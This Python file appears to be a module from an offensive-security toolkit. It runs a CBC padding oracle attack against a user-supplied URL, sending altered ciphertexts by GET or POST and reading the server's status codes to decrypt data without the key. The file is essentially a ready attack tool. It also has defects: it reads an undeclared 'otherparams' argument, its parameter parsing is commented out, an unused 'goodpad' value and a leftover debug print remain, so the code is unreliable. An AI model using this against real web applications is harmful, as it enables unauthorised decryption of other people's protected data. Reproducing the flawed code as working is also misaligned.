from modules.abstract_module import *
from utils.paddingoracle import PaddingOracleAttack
from json import loads
import requests

class PaddingOracleModule(AbstractModule):
    name = 'padding_oracle_attack'

    description = 'Runs a CBC Padding Oracle Attack'

    arguments = [ModuleArgumentDescription('ciphertext','Ciphertext to decrypt',True),
                 ModuleArgumentDescription('url','URL to attack',False),
                 ModuleArgumentDescription('verb','Whether this is through a GET or POST request',False),
                 ModuleArgumentDescription('cipherparam','Parameter for ciphertext',False),
                 ModuleArgumentDescription('params','Any other params and values in JSON format',False,defaultValue='{}'),
                 ModuleArgumentDescription('goodpad','Status code for good pad',False),
                 ModuleArgumentDescription('badpad', 'Status code for bad pad',False)]

    def execute(self):
        ciphertext = self.get_argument_value('ciphertext')
        url = self.get_argument_value('url')
        verb = self.get_argument_value('verb')
        cipherparam = self.get_argument_value('cipherparam')
        paramstring = self.get_argument_value('otherparams')
        print(type(paramstring))
        #params = loads()
        params = {}
        goodpad = int(self.get_argument_value('goodpad'))
        badpad = int(self.get_argument_value('badpad'))

        def makeoracle():
            if verb == 'GET':
                def oracle(ctext):
                    params[cipherparam] = ctext
                    r = requests.get(url,params)
                    return r.status_code != badpad
                return oracle
            elif verb == 'POST':
                def oracle(ctext):
                    params[cipherparam] = ctext
                    r = requests.post(url,params=params)
                    return r.status_code != badpad
                return oracle

        poa = PaddingOracleAttack(ciphertext,makeoracle())
        print(poa.runattack())
